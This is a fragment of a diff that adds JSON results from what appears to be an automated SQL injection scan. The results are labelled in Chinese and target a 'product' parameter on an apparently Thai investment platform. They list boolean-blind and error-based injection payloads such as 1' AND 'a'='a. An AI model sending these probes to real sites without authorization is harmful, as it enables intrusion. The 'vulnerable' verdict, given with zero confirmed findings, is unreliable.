+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        }
+      ],
+      "confirmed_count": 0,
+      "status": "有漏洞"
+    }
+  }
+}
